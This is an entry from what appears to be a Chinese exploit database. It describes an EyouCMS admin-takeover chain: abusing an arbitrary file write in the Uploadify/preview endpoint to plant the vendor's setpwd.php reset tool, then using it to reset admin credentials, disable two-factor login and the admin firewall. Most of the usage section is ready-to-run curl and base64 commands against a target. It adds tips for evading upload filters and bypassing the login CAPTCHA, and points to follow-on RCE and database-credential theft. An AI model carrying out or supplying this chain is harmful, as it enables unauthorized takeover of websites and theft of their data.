# EyouCMS 后台接管跳板：官方 setpwd.php 密码/密保重置工具（配合任意文件写）

- **code**: eyoucms-后台接管跳板-官方-setpwd.php-密码-密保重置工具-配合任意文件写
- **kind**: script
- **category**: auth-bypass
- **component**: EyouCMS
- **versions**: EyouCMS 全版本适用（官方工具，v2.0.8）
- **severity**: high
- **language**: php
- **source**: web
- **source_url**: https://www.eyoucms.com/help/faq/10882.html
- **verified_note**: 未在真实目标验证。工具与用法均引自 EyouCMS 官方帮助页（原文照录），组合链（任意文件写 → 投递 setpwd.php → 接管后台）为设计思路，未实测。
- **path**: pocs/eyoucms-后台接管跳板-官方-setpwd.php-密码-密保重置工具-配合任意文件写/eyoucms_setpwd_admin_takeover.md
- **tags**: eyoucms,后台接管,密码重置,任意文件写,跳板,setpwd
- **created_at**: 2026-10-06T12:14:27.734Z
- **found_by**: exploit

## 描述

EyouCMS 官方提供的后台密码/密保重置工具 setpwd.php（单文件，放网站根目录即可运行）。官方确认易优无出厂默认后台口令（"没有默认密码，忘记了只有重置"），因此任何"需要后台"的利用链都卡在口令上；而只要拿到任意文件写权限，投递该工具即可一键接管后台（重置密码/密保/关双因子/解除后台防火墙）。这是把"任意文件写"升级为"后台管理员"的关键跳板。

## 用法

```
# 前提：已取得任意文件写（前台 Uploadify/preview、后台上传、其它写文件点任一）
# 1) 下载官方工具
curl -sLO 'https://update.eyoucms.com/other/易优后台登录异常小工具_v2.0.8.zip'
unzip -o 易优后台登录异常小工具_v2.0.8.zip            # 得到 setpwd.php
# 2) 用任意文件写把它落到目标（示例：走前台 Uploadify/preview）
B64=$(base64 -w0 setpwd.php)
echo -n "$B64" | md5sum                              # 得到落盘文件名 <MD5>
printf 'data:image/php;base64,%s' "$B64" > /tmp/b.bin
curl -sk -X POST 'http://TARGET/example.com/api/Uploadify/preview' \
  -H 'Content-Type: text/plain;charset=UTF-8' --data-binary @/tmp/b.bin
# 3) 访问工具（路径按落盘位置）
curl -sk 'http://TARGET/preview/<MD5>.php'
#    → 在页面上执行：重置管理员密码 / 重置密保问题 / 关闭登录双因子 / 解除后台防火墙
# 4) 用新口令登录后台
curl -sk -c /tmp/c.txt 'http://TARGET/login.php?m=admin&lang=cn'
# 5) 接管后 → 后台模板写马（CVE-2026-7388）/ 任意文件复制读库配置（CVE-2026-6561）
# 6) 用完立即删除 setpwd.php（官方也这么提示）
```

## 正文

```
官方「后台登录异常小工具」功能清单（官方页面原文）：
  1、重置管理员密码   2、密保问题重置   3、解除登录锁定
  4、关闭登录双因子   5、解除后台防火墙 6、修复登录异常
  7、重置安全锁配置

官方下载（直链，update.eyoucms.com）：
  https://update.eyoucms.com/other/易优后台登录异常小工具_v2.0.8.zip
官方说明页：
  https://www.eyoucms.com/help/faq/10882.html

官方用法原文：
  「下载附件后解压，将 setpwd.php 文件上传到网站根目录，
    浏览器访问 http://你的网址/setpwd.php，按照操作执行就可以。
    修改完之后，请立即删除该文件，免得被其他人修改。」

组合利用链（把"任意文件写"变成"后台管理员"）：
  ① 前台任意文件写（api/Uploadify::preview，<=1.5.1）落 setpwd.php
     或 其他任意文件写 / 后台 Logo 上传
  ② 访问 /preview/<md5>.php  或  /setpwd.php
     → 重置 admin 密码 + 重置密保 + 关闭双因子 + 解除后台防火墙
  ③ 用新口令登录 /login.php?m=admin
  ④ 走后台模板写马（CVE-2026-7388 {:} 绕过）拿 RCE
     或走 edit_adminlogo 任意文件复制（CVE-2026-6561）读 application/database.php 拿库口令

注意：setpwd.php 体积大、base64 很长；若上传通道有敏感词过滤，
      先把源码里的敏感词变形（双写/改名）再投递。

另一条相关事实：EyouCMS 后台登录有验证码（ey_fleshVerify），
盲喷洒必须先处理验证码（OCR / 同 session 复用 / 找无需验证码的 ajax 登录点）。

```
